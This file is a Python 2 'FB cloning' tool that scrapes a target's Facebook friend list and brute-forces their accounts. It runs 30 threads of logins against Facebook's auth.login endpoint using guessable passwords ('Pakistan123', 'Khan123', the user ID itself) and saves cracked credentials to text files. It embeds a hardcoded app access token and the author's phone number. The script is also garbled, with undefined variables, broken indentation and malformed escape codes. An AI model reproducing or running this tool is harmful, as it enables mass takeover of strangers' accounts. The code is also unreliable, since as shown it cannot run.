# Ustad# SIDRA5# Thuglife# Somibro# Gamz#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(3.0 / 200)

def tik():
	titik = ['S   ','O  ','M ',' i']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;96m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """


\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;91m██╔════╝██╔══██╗████╗░████║██║
\033[1;97m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;97m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;91m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝

\033[1;97m
_________________________.s$$_____________s$
________________________s$$$’____________s$$
______________________.s$$$³´_______,___s$$³
_____________________s$$$$³______.s$’___$$³
________________,____$$$$$.______s$³____³$
________________$___$$$$$$s_____s$³_____³,
_______________s$___‘³$$$$$$s___$$$
_______________$$____³$$$$$$s.__³$$s
_______________³$.____³$$$$$$$s_.s$$$____s´
_______________`$$.____³$$$$$$$_$$$$___s³
________________³$$s____³$$$$$$s$$$³__s$’
_________________³$$s____$$$$$s$$$$’__s$$
_____________`s.__$$$$___s$$$$$$$$³_.s$$³__s
______________$$_s$$$$..s$$$$$$$$$$$$$$³__s$
______________s$.s$$$$s$$$$$$$$$$$$$$$$_s$$
_____________s$$$$$$$$$$$$$$$$$$$$$$$$$$$³
____________s$$$ssss$$$$$$$$$$$$$ssss$$$$$´
___________$$s§§§§§§§§§s$$$$$$s§§§§§§§§s$,
___________³§§§§§§§§§§§§§s$s§§§§§§§§§§§§s
___________§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§
___________³§§§§§§§§§§§§§§§§§§§§§§§§§§§§§
____________³§§§§§§§§§§§§§§§§§§§§§§§§§§§³
_____________³§§§§§§§§§§§§§§§§§§§§§§§§§³
______________³§§§§§§§§§§§§§§§§§§§§§§§³
________________³§§§§§§§§§§§§§§§§§§§³
__________________³§§§§§§§§§§§§§§§³
____________________³§§§§§§§§§§§³
_______________________³§§§§§³
_________________________³§³



\033[1;96m---------------------BRAND---------------------
action()
                
  033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92mPAK STAR🎭                     \033[0;91m      ║
\033[0;91m║\033[0;91mYoutube :\033[0;92m SOMI BRAND..                    \033[0;91m     ║
\033[0;91m║ \033[0;93m  :\033[0;92m Whtsapp Num:\033[0;91m+923455453538║
\033[0;95m╰════════════════════════════════════════════╯
             
                
\033[1;96m--------------------SOMI----------------------
"""

####Logo####

logo1 = """
  \033[1;92m _____    ____    __  __   _____ 
 \033[1;93m / ____|  / __ \  |  \/  | |_   _|
 \033[1;94m| (___   | |  | | | \  / |   | |  
\033[1;95m  \___ \  | |  | | | |\/| |   | |  
\033[1;96m  ____) | | |__| | | |  | |  _| |_ 
 \033[1;91m|_____/   \____/  |_|  |_| |_____|
\033[1;92m━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
\033[1;93mDEVOLPER  :  STAR BOY
\033[1;91mPROGRAM   :  PAKISTAN FB CLONING
\033[1;96mCODING......  :  UTF 8 PYTHON2
\033[1;92mFACEBOOK  :  SOMI AWAN
\033[1;95mWHATSAPP :  03455453538
\033[1;94mYOUTUBE     :  SOMI BRAND
\033[1;92m━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
                                   
                                   
"""
logo2 = """
  \033[1;92m _____    ____    __  __   _____ 
 \033[1;93m / ____|  / __ \  |  \/  | |_   _|
 \033[1;94m| (___   | |  | | | \  / |   | |  
\033[1;95m  \___ \  | |  | | | |\/| |   | |  
\033[1;96m  ____) | | |__| | | |  | |  _| |_ 
 \033[1;91m|_____/   \____/  |_|  |_| |_____|
\033[1;92m━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
\033[1;93mDEVOLPER  :  STAR BOY
\033[1;91mPROGRAM   :  PAKISTAN FB CLONING
\033[1;96mCODING......  :  UTF 8 PYTHON2
\033[1;92mFACEBOOK  :  SOMI AWAN
\033[1;95mWHATSAPP :  03455453538
\033[1;94mYOUTUBE     :  SOMI BRAND
\033[1;92m━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

                                   
"""

##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo1
    jalan('\033[1;95m═════════ AM ══════════════════════════════════')
    jalan('\033[1;96m══════════ BRAND ══════════════════════════════')
    jalan('\033[1;93m═════════════ SOMI ════════════════════════════')
    jalan('\x1b[1;94m〖\x1b[1;92m1\x1b[1;94m〗\x1b[1;96mSTAR CLONE WITH BRAND BOY')
    time.sleep(0.05)
    jalan('\x1b[1;94m〖\x1b[1;92m0\x1b[1;94m〗 \x1b[1;93mEXIST  ')
    pilih_login()

def pilih_login():
    somi = raw_input("\n\033[1;95m►\033[1;93m")
    if somi =='':
        print "\x1b[1;97mFill In Correctly"
        action()
    elif somi =="1":
    	tik()
        os.system("clear")
        print logo2
        idt = raw_input("\033[1;96m[⊱⋕⊰]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;37m[⊱⋕⊰] Getting ID Loading process........ "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	
	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \ki033[1;92m"+str(len(id)) 
	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;32;40m[⊱⋕⊰] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m   ❈     \033[1;91mCp Account Open After 7 days      \033[1;94m  ❈"
	print 42*"\033[1;97m="
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m(WORKING) \n ►\033[1;92m' + k + c + user + '  \n►  ' + pass1+ '\n═════════════ SOMI ════════════════════════════'                                
                okb = open('save/successful.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;92m(AFTAR 7 DAYS)\n►\033[1;96m ' + k + c + user + '  \n►  ' + pass1+ '\n═════════════ SOMI ════════════════════════════'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(WORKING) \n ►\033[1;92m' + k + c + user +  '  \n►  ' + pass2+ '\n═════════════ SOMI ════════════════════════════'
                        okb = open('save/successful.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;92m(AFTAR 7 DAYS)\n►\033[1;96m ' + k + c + user + '\n  ►  ' + pass2+ '\n═════════════ SOMI ════════════════════════════'
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3="Pakistan123"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(WORKING)\n  ►\033[1;92m' + k + c + user + '  \n►  ' + pass3+ '\n═════════════ SOMI ════════════════════════════'
                                okb = open('save/successful.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;92m(AFTAR 7 DAYS) \n►\033[1;96m' + k + c + user + '  \n►  ' + pass3 + '\n═════════════ SOMI ════════════════════════════'
                                    cps = open('save/checkpoint.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4="Pakistan"
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(WORKING)\n ►\033[1;92m ' + k + c + user + '\n  ►  ' + pass4 + '\n═════════════ SOMI ════════════════════════════'
                                        okb = open('save/successful.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;92m(AFTAR 7 DAYS)\n ➢\033[1;96m' + k + c + user + '  \n►  ' + pass4+ '\n═════════════ SOMI ════════════════════════════'
                                            cps = open('save/checkpoint.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5="Khan123"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(WORKING)\n  ►\033[1;92m' + k + c + user + ' \n  ►  ' + pass5+ '\n═════════════ SOMI ════════════════════════════'
                                                okb = open('save/successful.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;92m(AFTAR 7 DAYS)\n►\033[1;96m ' + k + c + user + '  \n►  ' + pass5 + '\n═════════════ SOMI ════════════════════════════'
                                                    cps = open('save/checkpoint.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                                                                                                                                                                                                
                                                                                                                                                                                                                
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            

                                                                                                                                                                                                                
                                                                                                                                                                                                                
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            


                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                            



        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
    print('Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your Offline account Will Open after 10 to 20 days")
    print ''
    print """


\033[1;96mThanks me later
\033[1;95mFb\033[1;97mSOmi
"""

    
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()

